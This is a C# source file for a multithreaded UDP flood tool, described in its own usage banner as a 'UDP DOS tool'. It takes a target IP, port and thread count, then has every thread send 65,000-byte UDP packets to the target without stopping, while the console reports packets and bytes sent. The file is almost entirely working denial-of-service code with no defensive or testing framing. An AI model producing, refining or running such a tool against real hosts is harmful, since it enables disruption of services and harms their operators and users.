using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using System.Threading;

namespace flood
{
    class flood
    {
        private static double sent_packets = 0;
        private static double sent_bytes = 0;
        private static bool exit = false;
        private static bool start = false;

        static int Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("ABOUT.....: UDP DOS tool... floods target with 65000 bytes");
                Console.WriteLine("AUTHOR....: C0LD");
                Console.WriteLine("BULIT IN..: C# .NET");
                Console.WriteLine("USAGE.....: flood.exe <threads> <ip> <port>");
                return 1;
            }

            if (args.Length >= 3)
            {
                if (int.TryParse(args[0], out int threads) == false) { Console.WriteLine(args[0] + " is not a valid thread number (int)"); return 1; }
                if (IPAddress.TryParse(args[1], out IPAddress ip) == false) { Console.WriteLine(args[1] + " is not a valid ip address"); return 1; }
                if (int.TryParse(args[2], out int port) == false) { Console.WriteLine(args[2] + " is not a valid port (int/number)"); return 1; }


                IPEndPoint ep = new IPEndPoint(ip, port);

                for (int i = 0; i <= threads; i++)
                {
                    Console.Write("\r> loading [" + i + "]");
                    new Thread(() => attack(ep)){ IsBackground = true }.Start();
                }
                Console.WriteLine();

                Console.WriteLine("> target: " + ep.Address + ":" + ep.Port);
                Console.WriteLine("> press any key start.");
                Console.ReadKey();
                start = true;
                
                Console.WriteLine("> attacking...");
                Console.WriteLine("");

                while (exit == false)
                {
                    Console.WriteLine("sent packets...: " + sent_packets);
                    Console.WriteLine("sent bytes.....: " + ROund(sent_bytes) + " (" + sent_bytes + " bytes)");
                    Console.WriteLine("");
                    Thread.Sleep(800);
                }
            }
            else
            {
                Console.Error.WriteLine("missing arguments...");
                return 1;
            }

            return 0;
        }
        
        private static void attack(IPEndPoint endp)
        {
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            
            byte[] send_buffer = new byte[65000];
            
            while (!exit)
            {
                if (!start) { Thread.Sleep(100); continue; }

                socket.SendTo(send_buffer, endp);
                sent_packets++;
                sent_bytes = sent_bytes + send_buffer.LongLength;
            }
        }

        public static string ROund(double len)
        {
            string[] sizes = { "B", "KB", "MB", "GB", "TB" };
            int order = 0;
            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len = len / 1024;
            }
            return string.Format("{0:0.##} {1}", len, sizes[order]);
        }
    }
}
